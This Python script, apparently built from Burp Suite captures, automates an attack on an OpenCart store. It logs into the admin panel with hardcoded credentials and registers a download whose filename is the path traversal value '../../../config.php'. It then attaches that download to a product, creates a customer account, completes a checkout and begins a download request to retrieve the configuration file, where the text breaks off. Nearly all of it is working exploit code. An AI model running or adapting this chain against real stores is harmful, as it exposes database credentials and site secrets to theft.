import requests
import urllib3
requests.packages.urllib3.disable_warnings()
host = "opencart"


def loginad():
   burp0_url = "https://"+host+":443//admin/index.php?route=common/login"
   burp0_headers = {"Referer": "https://"+host+"/admin/", 
   "Cache-Control": "max-age=0", 
   "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
   "Accept-Language": "en-US,en;q=0.8,zh-Hans-CN;q=0.5,zh-Hans;q=0.3",
   "Content-Type": "multipart/form-data; boundary=---------------------------7e43b42b30a14", 
   "Upgrade-Insecure-Requests": "1", 
   "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.140 Safari/537.36 Edge/18.17763", 
   "Accept-Encoding": "gzip, deflate", 
   "Connection": "close"}
   burp0_data = "-----------------------------7e43b42b30a14\nContent-Disposition: form-data; name=\"username\"\n\nuser\n-----------------------------7e43b42b30a14\nContent-Disposition: form-data; name=\"password\"\n\nbitnami1\n-----------------------------7e43b42b30a14--\n"
    # r=requests.post(burp0_url, headers=burp0_headers,  data=burp0_data,verify=False)
#cookies=r.cookies.get_dict()

#cookie
   #  cookies=r.cookies['OCSESSID']

#token
   session = requests.Session()
   res = session.post(burp0_url, headers=burp0_headers,  data=burp0_data,verify=False, allow_redirects=False)
   location=res.headers['location']
   cookies=res.cookies['OCSESSID']
   token=location[-32:]
     
   #print(cookies)
   #print(token)
   return cookies, token
     



def addfile(adcookies,adtoken):
    burp0_url = "https://"+host+":443/admin/index.php?route=catalog/download/add&user_token="+adtoken
    burp0_cookies = {"currency": "USD", "__atuvc": "2%7C15", "language": "en-gb", "OCSESSID": adcookies}
    burp0_headers = {"Connection": "close", "Cache-Control": "max-age=0", "Origin": "https://"+host, "Upgrade-Insecure-Requests": "1", "Content-Type": "multipart/form-data; boundary=----WebKitFormBoundary5RfMTwxCvuqzbNCQ", "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.163 Safari/537.36", "Sec-Fetch-Dest": "document", "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9", "Sec-Fetch-Site": "same-origin", "Sec-Fetch-Mode": "navigate", "Sec-Fetch-User": "?1", "Referer": "https://"+host+"/admin/index.php?route=catalog/download/add&user_token="+adtoken, "Accept-Encoding": "gzip, deflate", "Accept-Language": "zh-CN,zh;q=0.9"}
    burp0_data = "------WebKitFormBoundary5RfMTwxCvuqzbNCQ\nContent-Disposition: form-data; name=\"download_description[1][name]\"\n\nfile\n------WebKitFormBoundary5RfMTwxCvuqzbNCQ\nContent-Disposition: form-data; name=\"filename\"\n\n../../../config.php\n------WebKitFormBoundary5RfMTwxCvuqzbNCQ\nContent-Disposition: form-data; name=\"mask\"\n\n123\n------WebKitFormBoundary5RfMTwxCvuqzbNCQ--\n"
    session = requests.Session()
    res = session.post(burp0_url, headers=burp0_headers,  data=burp0_data,verify=False, allow_redirects=False)
    #print(res.text)
    

    burp0_url = "https://"+host+":443/admin/index.php?route=catalog/download&user_token="+adtoken
    burp0_cookies = {"currency": "USD", "__atuvc": "2%7C15", "language": "en-gb", "OCSESSID": adcookies}
    burp0_headers = {"Connection": "close", "Cache-Control": "max-age=0", "Upgrade-Insecure-Requests": "1", "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.163 Safari/537.36", "Sec-Fetch-Dest": "document", "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9", "Sec-Fetch-Site": "same-origin", "Sec-Fetch-Mode": "navigate", "Sec-Fetch-User": "?1", "Referer": "https://"+host+"/admin/index.php?route=catalog/download/add&user_token="+adtoken, "Accept-Encoding": "gzip, deflate", "Accept-Language": "zh-CN,zh;q=0.9"}
    r=requests.get(burp0_url, headers=burp0_headers, cookies=burp0_cookies,verify=False)
    #print("add file")
    #print(r.status_code)
    #print(r.text)
   
   
def setfile(adcookies,adtoken):
    burp0_url = "https://"+host+":443//admin/index.php?route=catalog/product/edit&user_token="+adtoken+"&product_id=41"
    burp0_cookies = {"OCSESSID": adcookies, "__atuvc": "1%7C12", "currency": "EUR", "language": "en-gb"}
    burp0_headers = {"Referer": "https://"+host+"/admin/index.php?route=catalog/product/edit&user_token="+adtoken+"&product_id=41", "Cache-Control": "max-age=0", "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8", "Accept-Language": "en-US,en;q=0.8,zh-Hans-CN;q=0.5,zh-Hans;q=0.3", "Content-Type": "multipart/form-data; boundary=---------------------------7e420b271064c", "Upgrade-Insecure-Requests": "1", "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.140 Safari/537.36 Edge/18.17763", "Accept-Encoding": "gzip, deflate", "Connection": "close"}
    burp0_data = "-----------------------------7e420b271064c\nContent-Disposition: form-data; name=\"product_description[1][name]\"\n\niMac\n-----------------------------7e420b271s064c\nContent-Disposition: form-data; name=\"product_description[1][description]\"\n\n<div>\n\tJust when you thought iMac had everything, now there\xc2\xb4s even more. More powerful Intel Core 2 Duo processors. And more memory standard. Combine this with Mac OS X Leopard and iLife \xc2\xb408, and it\xc2\xb4s more all-in-one than ever. iMac packs amazing performance into a stunningly slim space.</div>\n\n-----------------------------7e420b271064c\nContent-Disposition: form-data; name=\"files\"; filename=\"\"\nContent-Type: application/octet-stream\n\n\n-----------------------------7e420b271064c\nContent-Disposition: form-data; name=\"file\"; filename=\"\"\nContent-Type: application/octet-stream\n\n\n-----------------------------7e420b271064c\nContent-Disposition: form-data; name=\"product_description[1][meta_title]\"\n\niMac\n-----------------------------7e420b271064c\nContent-Disposition: form-data; name=\"product_description[1][meta_description]\"\n\n\n-----------------------------7e420b271064c\nContent-Disposition: form-data; name=\"product_description[1][meta_keyword]\"\n\n\n-----------------------------7e420b271064c\nContent-Disposition: form-data; name=\"product_description[1][tag]\"\n\n\n-----------------------------7e420b271064c\nContent-Disposition: form-data; name=\"model\"\n\nProduct 14\n-----------------------------7e420b271064c\nContent-Disposition: form-data; name=\"sku\"\n\n\n-----------------------------7e420b271064c\nContent-Disposition: form-data; name=\"upc\"\n\n\n-----------------------------7e420b271064c\nContent-Disposition: form-data; name=\"ean\"\n\n\n-----------------------------7e420b271064c\nContent-Disposition: form-data; name=\"jan\"\n\n\n-----------------------------7e420b271064c\nContent-Disposition: form-data; name=\"isbn\"\n\n\n-----------------------------7e420b271064c\nContent-Disposition: form-data; name=\"mpn\"\n\n\n-----------------------------7e420b271064c\nContent-Disposition: form-data; name=\"location\"\n\n\n-----------------------------7e420b271064c\nContent-Disposition: form-data; name=\"price\"\n\n100.0000\n-----------------------------7e420b271064c\nContent-Disposition: form-data; name=\"tax_class_id\"\n\n9\n-----------------------------7e420b271064c\nContent-Disposition: form-data; name=\"quantity\"\n\n976\n-----------------------------7e420b271064c\nContent-Disposition: form-data; name=\"minimum\"\n\n1\n-----------------------------7e420b271064c\nContent-Disposition: form-data; name=\"subtract\"\n\n1\n-----------------------------7e420b271064c\nContent-Disposition: form-data; name=\"stock_status_id\"\n\n5\n-----------------------------7e420b271064c\nContent-Disposition: form-data; name=\"shipping\"\n\n1\n-----------------------------7e420b271064c\nContent-Disposition: form-data; name=\"date_available\"\n\n2009-02-03\n-----------------------------7e420b271064c\nContent-Disposition: form-data; name=\"length\"\n\n0.00000000\n-----------------------------7e420b271064c\nContent-Disposition: form-data; name=\"width\"\n\n0.00000000\n-----------------------------7e420b271064c\nContent-Disposition: form-data; name=\"height\"\n\n0.00000000\n-----------------------------7e420b271064c\nContent-Disposition: form-data; name=\"length_class_id\"\n\n1\n-----------------------------7e420b271064c\nContent-Disposition: form-data; name=\"weight\"\n\n5.00000000\n-----------------------------7e420b271064c\nContent-Disposition: form-data; name=\"weight_class_id\"\n\n1\n-----------------------------7e420b271064c\nContent-Disposition: form-data; name=\"status\"\n\n1\n-----------------------------7e420b271064c\nContent-Disposition: form-data; name=\"sort_order\"\n\n0\n-----------------------------7e420b271064c\nContent-Disposition: form-data; name=\"manufacturer\"\n\nApple\n-----------------------------7e420b271064c\nContent-Disposition: form-data; name=\"manufacturer_id\"\n\n8\n-----------------------------7e420b271064c\nContent-Disposition: form-data; name=\"category\"\n\n\n-----------------------------7e420b271064c\nContent-Disposition: form-data; name=\"product_category[]\"\n\n27\n-----------------------------7e420b271064c\nContent-Disposition: form-data; name=\"filter\"\n\n\n-----------------------------7e420b271064c\nContent-Disposition: form-data; name=\"product_store[]\"\n\n0\n-----------------------------7e420b271064c\nContent-Disposition: form-data; name=\"download\"\n\n\n-----------------------------7e420b271064c\nContent-Disposition: form-data; name=\"product_download[]\"\n\n1\n-----------------------------7e420b271064c\nContent-Disposition: form-data; name=\"related\"\n\n\n-----------------------------7e420b271064c\nContent-Disposition: form-data; name=\"product_related[]\"\n\n42\n-----------------------------7e420b271064c\nContent-Disposition: form-data; name=\"option\"\n\n\n-----------------------------7e420b271064c\nContent-Disposition: form-data; name=\"image\"\n\ncatalog/demo/imac_1.jpg\n-----------------------------7e420b271064c\nContent-Disposition: form-data; name=\"product_image[0][image]\"\n\ncatalog/demo/imac_3.jpg\n-----------------------------7e420b271064c\nContent-Disposition: form-data; name=\"product_image[0][sort_order]\"\n\n0\n-----------------------------7e420b271064c\nContent-Disposition: form-data; name=\"product_image[1][image]\"\n\ncatalog/demo/imac_2.jpg\n-----------------------------7e420b271064c\nContent-Disposition: form-data; name=\"product_image[1][sort_order]\"\n\n0\n-----------------------------7e420b271064c\nContent-Disposition: form-data; name=\"points\"\n\n0\n-----------------------------7e420b271064c\nContent-Disposition: form-data; name=\"product_reward[1][points]\"\n\n0\n-----------------------------7e420b271064c\nContent-Disposition: form-data; name=\"product_seo_url[0][1]\"\n\nimac\n-----------------------------7e420b271064c\nContent-Disposition: form-data; name=\"product_layout[0]\"\n\n\n-----------------------------7e420b271064c--\n"
    r=requests.post(burp0_url, headers=burp0_headers, cookies=burp0_cookies, data=burp0_data,verify=False)
    print("set file")
    #print(r.text)
    set1=r.status_code
    return set1


   
def register(adcookies,adtoken):
    burp0_url = "https://"+host+":443/admin/index.php?route=customer/customer/add&user_token="+adtoken
    burp0_cookies = {"OCSESSID": adcookies}
    burp0_headers = {"Connection": "close", "Cache-Control": "max-age=0", "Origin": "https://"+host, "Upgrade-Insecure-Requests": "1", "Content-Type": "multipart/form-data; boundary=----WebKitFormBoundaryA1dWw4VKET5MLtqf", "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.163 Safari/537.36", "Sec-Fetch-Dest": "document", "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9", "Sec-Fetch-Site": "same-origin", "Sec-Fetch-Mode": "navigate", "Sec-Fetch-User": "?1", "Referer": "https://"+host+"/admin/index.php?route=customer/customer/add&user_token=JHKk0baTG54uMMIUeuxGHuU89yPtUcJg", "Accept-Encoding": "gzip, deflate", "Accept-Language": "zh-CN,zh;q=0.9"}
    burp0_data = "------WebKitFormBoundaryA1dWw4VKET5MLtqf\r\nContent-Disposition: form-data; name=\"customer_group_id\"\r\n\r\n1\r\n------WebKitFormBoundaryA1dWw4VKET5MLtqf\r\nContent-Disposition: form-data; name=\"firstname\"\r\n\r\nx\r\n------WebKitFormBoundaryA1dWw4VKET5MLtqf\r\nContent-Disposition: form-data; name=\"lastname\"\r\n\r\nx\r\n------WebKitFormBoundaryA1dWw4VKET5MLtqf\r\nContent-Disposition: form-data; name=\"email\"\r\n\r\n1@qq.com\r\n------WebKitFormBoundaryA1dWw4VKET5MLtqf\r\nContent-Disposition: form-data; name=\"telephone\"\r\n\r\n122\r\n------WebKitFormBoundaryA1dWw4VKET5MLtqf\r\nContent-Disposition: form-data; name=\"password\"\r\n\r\n1234\r\n------WebKitFormBoundaryA1dWw4VKET5MLtqf\r\nContent-Disposition: form-data; name=\"confirm\"\r\n\r\n1234\r\n------WebKitFormBoundaryA1dWw4VKET5MLtqf\r\nContent-Disposition: form-data; name=\"newsletter\"\r\n\r\n0\r\n------WebKitFormBoundaryA1dWw4VKET5MLtqf\r\nContent-Disposition: form-data; name=\"status\"\r\n\r\n1\r\n------WebKitFormBoundaryA1dWw4VKET5MLtqf\r\nContent-Disposition: form-data; name=\"safe\"\r\n\r\n0\r\n------WebKitFormBoundaryA1dWw4VKET5MLtqf\r\nContent-Disposition: form-data; name=\"company\"\r\n\r\n\r\n------WebKitFormBoundaryA1dWw4VKET5MLtqf\r\nContent-Disposition: form-data; name=\"website\"\r\n\r\n\r\n------WebKitFormBoundaryA1dWw4VKET5MLtqf\r\nContent-Disposition: form-data; name=\"tracking\"\r\n\r\n\r\n------WebKitFormBoundaryA1dWw4VKET5MLtqf\r\nContent-Disposition: form-data; name=\"commission\"\r\n\r\n5\r\n------WebKitFormBoundaryA1dWw4VKET5MLtqf\r\nContent-Disposition: form-data; name=\"tax\"\r\n\r\n\r\n------WebKitFormBoundaryA1dWw4VKET5MLtqf\r\nContent-Disposition: form-data; name=\"payment\"\r\n\r\ncheque\r\n------WebKitFormBoundaryA1dWw4VKET5MLtqf\r\nContent-Disposition: form-data; name=\"cheque\"\r\n\r\n\r\n------WebKitFormBoundaryA1dWw4VKET5MLtqf\r\nContent-Disposition: form-data; name=\"paypal\"\r\n\r\n\r\n------WebKitFormBoundaryA1dWw4VKET5MLtqf\r\nContent-Disposition: form-data; name=\"bank_name\"\r\n\r\n\r\n------WebKitFormBoundaryA1dWw4VKET5MLtqf\r\nContent-Disposition: form-data; name=\"bank_branch_number\"\r\n\r\n\r\n------WebKitFormBoundaryA1dWw4VKET5MLtqf\r\nContent-Disposition: form-data; name=\"bank_swift_code\"\r\n\r\n\r\n------WebKitFormBoundaryA1dWw4VKET5MLtqf\r\nContent-Disposition: form-data; name=\"bank_account_name\"\r\n\r\n\r\n------WebKitFormBoundaryA1dWw4VKET5MLtqf\r\nContent-Disposition: form-data; name=\"bank_account_number\"\r\n\r\n\r\n------WebKitFormBoundaryA1dWw4VKET5MLtqf\r\nContent-Disposition: form-data; name=\"affiliate\"\r\n\r\n0\r\n------WebKitFormBoundaryA1dWw4VKET5MLtqf--\r\n"
    requests.post(burp0_url, headers=burp0_headers, cookies=burp0_cookies, data=burp0_data,verify=False)
    print("register")

def logincus():   
    burp0_url = "https://"+host+":443//index.php?route=account/login"
    burp0_headers = {"Referer": "https://"+host+"/index.php?route=account/login","Cache-Control": "max-age=0","Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8","Accept-Language": "en-US,en;q=0.8,zh-Hans-CN;q=0.5,zh-Hans;q=0.3","Content-Type": "multipart/form-data; boundary=---------------------------7e43a11530a14","Upgrade-Insecure-Requests": "1", "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.140 Safari/537.36 Edge/18.17763","Accept-Encoding": "gzip, deflate","Connection": "close"}
    burp0_data = "-----------------------------7e43a11530a14\r\nContent-Disposition: form-data; name=\"email\"\r\n\r\n1@qq.com\r\n-----------------------------7e43a11530a14\r\nContent-Disposition: form-data; name=\"password\"\r\n\r\n1234\r\n-----------------------------7e43a11530a14--\r\n"
    r=requests.post(burp0_url, headers=burp0_headers, data=burp0_data,verify=False)
    cus_cookies=r.cookies['OCSESSID']
    print(cus_cookies)
    print("loginsucc")
    return cus_cookies
    


def addcart():
    
    
    burp0_url = "http://"+host+":80/index.php?route=checkout/cart/add"
    burp0_cookies = {"__atuvc": "1%7C12", "currency": "EUR", "language": "en-gb", "OCSESSID": cus_cookies}
    burp0_headers = {"Origin": "http://"+host+"", "Referer": "http://"+host+"/index.php?route=product/category&path=20_27", "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.140 Safari/537.36 Edge/18.17763", "Cache-Control": "max-age=0", "Accept": "application/json, text/javascript, */*; q=0.01", "Accept-Language": "en-US,en;q=0.8,zh-Hans-CN;q=0.5,zh-Hans;q=0.3", "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8", "X-Requested-With": "XMLHttpRequest", "Accept-Encoding": "gzip, deflate", "Pragma": "no-cache", "Connection": "close"}
    burp0_data = {"product_id": "41", "quantity": "1"}
    r=requests.post(burp0_url, headers=burp0_headers, cookies=burp0_cookies, data=burp0_data,verify=False)
   

def checkout():
    burp0_url = "https://"+host+":443//index.php?route=checkout/checkout"
    burp0_cookies = {"OCSESSID": cus_cookies, "__atuvc": "1%7C12", "currency": "EUR", "language": "en-gb"}
    burp0_headers = {"Referer": "https://"+host+"/index.php?route=checkout/cart", "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8", "Accept-Language": "en-US,en;q=0.8,zh-Hans-CN;q=0.5,zh-Hans;q=0.3", "Upgrade-Insecure-Requests": "1", "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.140 Safari/537.36 Edge/18.17763", "Accept-Encoding": "gzip, deflate", "Connection": "close"}
    requests.get(burp0_url, headers=burp0_headers, cookies=burp0_cookies,verify=False)
    
    
    burp0_url = "https://"+host+":443//index.php?route=checkout/payment_address"
    burp0_headers = {"Referer": "https://"+host+"/index.php?route=checkout/checkout", "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.140 Safari/537.36 Edge/18.17763", "Accept": "text/html, */*; q=0.01", "Accept-Language": "en-US,en;q=0.8,zh-Hans-CN;q=0.5,zh-Hans;q=0.3", "X-Requested-With": "XMLHttpRequest", "Accept-Encoding": "gzip, deflate", "Connection": "close"}
    requests.get(burp0_url, headers=burp0_headers, cookies=burp0_cookies,verify=False)
    


    burp0_url = "https://"+host+":443//index.php?route=checkout/checkout/country&country_id=222"
    burp0_headers = {"Referer": "https://"+host+"/index.php?route=checkout/checkout", "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.140 Safari/537.36 Edge/18.17763", "Accept": "application/json, text/javascript, */*; q=0.01", "Accept-Language": "en-US,en;q=0.8,zh-Hans-CN;q=0.5,zh-Hans;q=0.3", "X-Requested-With": "XMLHttpRequest", "Accept-Encoding": "gzip, deflate", "Connection": "close"}
    requests.get(burp0_url, headers=burp0_headers, cookies=burp0_cookies,verify=False)



    burp0_url = "https://"+host+":443//index.php?route=checkout/payment_address/save"
    burp0_headers = {"Origin": "https://"+host+"", "Referer": "https://"+host+"/index.php?route=checkout/checkout", "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.140 Safari/537.36 Edge/18.17763", "Accept": "application/json, text/javascript, */*; q=0.01", "Accept-Language": "en-US,en;q=0.8,zh-Hans-CN;q=0.5,zh-Hans;q=0.3", "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8", "X-Requested-With": "XMLHttpRequest", "Accept-Encoding": "gzip, deflate", "Connection": "close", "Cache-Control": "no-cache"}
    burp0_data = {"firstname": "x", "lastname": "x", "company": '', "address_1": "123", "address_2": '', "city": "123", "postcode": "123", "country_id": "222", "zone_id": "3513"}
    requests.post(burp0_url, headers=burp0_headers, cookies=burp0_cookies, data=burp0_data,verify=False)

 

    burp0_url = "https://"+host+":443//index.php?route=checkout/shipping_address"
    burp0_headers = {"Referer": "https://"+host+"/index.php?route=checkout/checkout", "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.140 Safari/537.36 Edge/18.17763", "Accept": "text/html, */*; q=0.01", "Accept-Language": "en-US,en;q=0.8,zh-Hans-CN;q=0.5,zh-Hans;q=0.3", "X-Requested-With": "XMLHttpRequest", "Accept-Encoding": "gzip, deflate", "Connection": "close"}
    requests.get(burp0_url, headers=burp0_headers, cookies=burp0_cookies,verify=False)


    burp0_url = "https://"+host+":443//index.php?route=checkout/checkout/country&country_id=222"
    burp0_headers = {"Referer": "https://"+host+"/index.php?route=checkout/checkout", "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.140 Safari/537.36 Edge/18.17763", "Accept": "application/json, text/javascript, */*; q=0.01", "Accept-Language": "en-US,en;q=0.8,zh-Hans-CN;q=0.5,zh-Hans;q=0.3", "X-Requested-With": "XMLHttpRequest", "Accept-Encoding": "gzip, deflate", "Connection": "close"}
    requests.get(burp0_url, headers=burp0_headers, cookies=burp0_cookies,verify=False)
  


    burp0_url = "https://"+host+":443//index.php?route=checkout/payment_address"
    burp0_headers = {"Referer": "https://"+host+"/index.php?route=checkout/checkout", "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.140 Safari/537.36 Edge/18.17763", "Accept": "text/html, */*; q=0.01", "Accept-Language": "en-US,en;q=0.8,zh-Hans-CN;q=0.5,zh-Hans;q=0.3", "X-Requested-With": "XMLHttpRequest", "Accept-Encoding": "gzip, deflate", "Connection": "close"}
    requests.get(burp0_url, headers=burp0_headers, cookies=burp0_cookies,verify=False)



    burp0_url = "https://"+host+":443//index.php?route=checkout/checkout/country&country_id=222"
    burp0_headers = {"Referer": "https://"+host+"/index.php?route=checkout/checkout", "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.140 Safari/537.36 Edge/18.17763", "Accept": "application/json, text/javascript, */*; q=0.01", "Accept-Language": "en-US,en;q=0.8,zh-Hans-CN;q=0.5,zh-Hans;q=0.3", "X-Requested-With": "XMLHttpRequest", "Accept-Encoding": "gzip, deflate", "Connection": "close"}
    requests.get(burp0_url, headers=burp0_headers, cookies=burp0_cookies,verify=False)




    burp0_url = "https://"+host+":443//index.php?route=checkout/shipping_address/save"
    burp0_headers = {"Origin": "https://"+host+"", "Referer": "https://"+host+"/index.php?route=checkout/checkout", "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.140 Safari/537.36 Edge/18.17763", "Accept": "application/json, text/javascript, */*; q=0.01", "Accept-Language": "en-US,en;q=0.8,zh-Hans-CN;q=0.5,zh-Hans;q=0.3", "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8", "X-Requested-With": "XMLHttpRequest", "Accept-Encoding": "gzip, deflate", "Connection": "close", "Cache-Control": "no-cache"}
    burp0_data = {"shipping_address": "existing", "address_id": "1", "firstname": '', "lastname": '', "company": '', "address_1": '', "address_2": '', "city": '', "postcode": "123", "country_id": "222", "zone_id": "3513"}
    requests.post(burp0_url, headers=burp0_headers, cookies=burp0_cookies, data=burp0_data,verify=False)

    
    burp0_url = "https://"+host+":443//index.php?route=checkout/shipping_method"
    burp0_headers = {"Referer": "https://"+host+"/index.php?route=checkout/checkout", "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.140 Safari/537.36 Edge/18.17763", "Accept": "text/html, */*; q=0.01", "Accept-Language": "en-US,en;q=0.8,zh-Hans-CN;q=0.5,zh-Hans;q=0.3", "X-Requested-With": "XMLHttpRequest", "Accept-Encoding": "gzip, deflate", "Connection": "close"}
    requests.get(burp0_url, headers=burp0_headers, cookies=burp0_cookies,verify=False)


    burp0_url = "https://"+host+":443//index.php?route=checkout/shipping_address"
    burp0_headers = {"Referer": "https://"+host+"/index.php?route=checkout/checkout", "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.140 Safari/537.36 Edge/18.17763", "Accept": "text/html, */*; q=0.01", "Accept-Language": "en-US,en;q=0.8,zh-Hans-CN;q=0.5,zh-Hans;q=0.3", "X-Requested-With": "XMLHttpRequest", "Accept-Encoding": "gzip, deflate", "Connection": "close"}
    requests.get(burp0_url, headers=burp0_headers, cookies=burp0_cookies,verify=False)


    burp0_url = "https://"+host+":443//index.php?route=checkout/checkout/country&country_id=222"
    burp0_headers = {"Referer": "https://"+host+"/index.php?route=checkout/checkout", "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.140 Safari/537.36 Edge/18.17763", "Accept": "application/json, text/javascript, */*; q=0.01", "Accept-Language": "en-US,en;q=0.8,zh-Hans-CN;q=0.5,zh-Hans;q=0.3", "X-Requested-With": "XMLHttpRequest", "Accept-Encoding": "gzip, deflate", "Connection": "close"}
    requests.get(burp0_url, headers=burp0_headers, cookies=burp0_cookies,verify=False)




    burp0_url = "https://"+host+":443//index.php?route=checkout/shipping_method/save"
    burp0_headers = {"Origin": "https://"+host+"", "Referer": "https://"+host+"/index.php?route=checkout/checkout", "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.140 Safari/537.36 Edge/18.17763", "Accept": "application/json, text/javascript, */*; q=0.01", "Accept-Language": "en-US,en;q=0.8,zh-Hans-CN;q=0.5,zh-Hans;q=0.3", "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8", "X-Requested-With": "XMLHttpRequest", "Accept-Encoding": "gzip, deflate", "Connection": "close", "Cache-Control": "no-cache"}
    burp0_data = {"shipping_method": "flat.flat", "comment": ''}
    requests.post(burp0_url, headers=burp0_headers, cookies=burp0_cookies, data=burp0_data,verify=False)

    

    burp0_url = "https://"+host+":443//index.php?route=checkout/payment_method"
    burp0_headers = {"Referer": "https://"+host+"/index.php?route=checkout/checkout", "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.140 Safari/537.36 Edge/18.17763", "Accept": "text/html, */*; q=0.01", "Accept-Language": "en-US,en;q=0.8,zh-Hans-CN;q=0.5,zh-Hans;q=0.3", "X-Requested-With": "XMLHttpRequest", "Accept-Encoding": "gzip, deflate", "Connection": "close"}
    requests.get(burp0_url, headers=burp0_headers, cookies=burp0_cookies,verify=False)





    burp0_url = "https://"+host+":443//index.php?route=checkout/payment_method/save"
    burp0_headers = {"Origin": "https://"+host+"", "Referer": "https://"+host+"/index.php?route=checkout/checkout", "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.140 Safari/537.36 Edge/18.17763", "Accept": "application/json, text/javascript, */*; q=0.01", "Accept-Language": "en-US,en;q=0.8,zh-Hans-CN;q=0.5,zh-Hans;q=0.3", "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8", "X-Requested-With": "XMLHttpRequest", "Accept-Encoding": "gzip, deflate", "Connection": "close", "Cache-Control": "no-cache"}
    burp0_data = {"payment_method": "cod", "comment": '', "agree": "1"}
    requests.post(burp0_url, headers=burp0_headers, cookies=burp0_cookies, data=burp0_data,verify=False)


    burp0_url = "https://"+host+":443//index.php?route=checkout/confirm"
    burp0_headers = {"Referer": "https://"+host+"/index.php?route=checkout/checkout", "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.140 Safari/537.36 Edge/18.17763", "Accept": "text/html, */*; q=0.01", "Accept-Language": "en-US,en;q=0.8,zh-Hans-CN;q=0.5,zh-Hans;q=0.3", "X-Requested-With": "XMLHttpRequest", "Accept-Encoding": "gzip, deflate", "Connection": "close"}
    requests.get(burp0_url, headers=burp0_headers, cookies=burp0_cookies,verify=False)



    burp0_url = "https://"+host+":443//index.php?route=extension/payment/cod/confirm"
    burp0_headers = {"Referer": "https://"+host+"/index.php?route=checkout/checkout", "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.140 Safari/537.36 Edge/18.17763", "Accept": "application/json, text/javascript, */*; q=0.01", "Accept-Language": "en-US,en;q=0.8,zh-Hans-CN;q=0.5,zh-Hans;q=0.3", "X-Requested-With": "XMLHttpRequest", "Accept-Encoding": "gzip, deflate", "Connection": "close"}
    requests.get(burp0_url, headers=burp0_headers, cookies=burp0_cookies,verify=False)



    burp0_url = "http://"+host+":80/index.php?route=checkout/success"
    burp0_headers = {"Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8", "Accept-Language": "en-US,en;q=0.8,zh-Hans-CN;q=0.5,zh-Hans;q=0.3", "Upgrade-Insecure-Requests": "1", "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.140 Safari/537.36 Edge/18.17763", "Accept-Encoding": "gzip, deflate", "Connection": "close"}
    requests.get(burp0_url, headers=burp0_headers, cookies=burp0_cookies,verify=False)

def download():
    burp0_url = "https://"+host+":443//index.php?route=account/download/download&download_id=1"
